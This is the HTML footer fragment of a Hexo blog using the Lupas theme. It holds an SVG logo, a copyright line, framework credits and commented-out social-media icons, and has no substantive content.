        <svg width="50" height="50" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" class="fill-current mt-3"><path d="M22.672 15.226l-2.432.811.841 2.515c.33 1.019-.209 2.127-1.23 2.456-1.15.325-2.148-.321-2.463-1.226l-.84-2.518-5.013 1.677.84 2.517c.391 1.203-.434 2.542-1.831 2.542-.88 0-1.601-.564-1.86-1.314l-.842-2.516-2.431.809c-1.135.328-2.145-.317-2.463-1.229-.329-1.018.211-2.127 1.231-2.456l2.432-.809-1.621-4.823-2.432.808c-1.355.384-2.558-.59-2.558-1.839 0-.817.509-1.582 1.327-1.846l2.433-.809-.842-2.515c-.33-1.02.211-2.129 1.232-2.458 1.02-.329 2.13.209 2.461 1.229l.842 2.515 5.011-1.677-.839-2.517c-.403-1.238.484-2.553 1.843-2.553.819 0 1.585.509 1.85 1.326l.841 2.517 2.431-.81c1.02-.33 2.131.211 2.461 1.229.332 1.018-.21 2.126-1.23 2.456l-2.433.809 1.622 4.823 2.433-.809c1.242-.401 2.557.484 2.557 1.838 0 .819-.51 1.583-1.328 1.847m-8.992-6.428l-5.01 1.675 1.619 4.828 5.011-1.674-1.62-4.829z"></path></svg>
        © 2020-2024 Lupas by Natro92
        <pre class="whitespace-pre-line">框架 <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/">Hexo</a> | 主题 <a target="_blank" rel="noopener" href="https://www.example.com">Lupas</a></pre>
    </aside>
    <nav>
        <header class="footer-title">Social</header>
        <!--<div class="grid grid-flow-col gap-4">-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M24 4.557c-.883.392-1.832.656-2.828.775 1.017-.609 1.798-1.574 2.165-2.724-.951.564-2.005.974-3.127 1.195-.897-.957-2.178-1.555-3.594-1.555-3.179 0-5.515 2.966-4.797 6.045-4.091-.205-7.719-2.165-10.148-5.144-1.29 2.213-.669 5.108 1.523 6.574-.806-.026-1.566-.247-2.229-.616-.054 2.281 1.581 4.415 3.949 4.89-.693.188-1.452.232-2.224.084.626 1.956 2.444 3.379 4.6 3.419-2.07 1.623-4.678 2.348-7.29 2.04 2.179 1.397 4.768 2.212 7.548 2.212 9.142 0 14.307-7.721 13.995-14.646.962-.695 1.797-1.562 2.457-2.549z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path></svg></a>-->
        <!--    <a><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="fill-current"><path d="M9 8h-3v4h3v12h5v-12h3.642l.358-4h-4v-1.667c0-.955.192-1.333 1.115-1.333h2.885v-5h-3.808c-3.596 0-5.192 1.583-5.192 4.615v3.385z"></path></svg></a>-->
        <!--</div>-->
    </nav>
</footer>
</body>

</html>


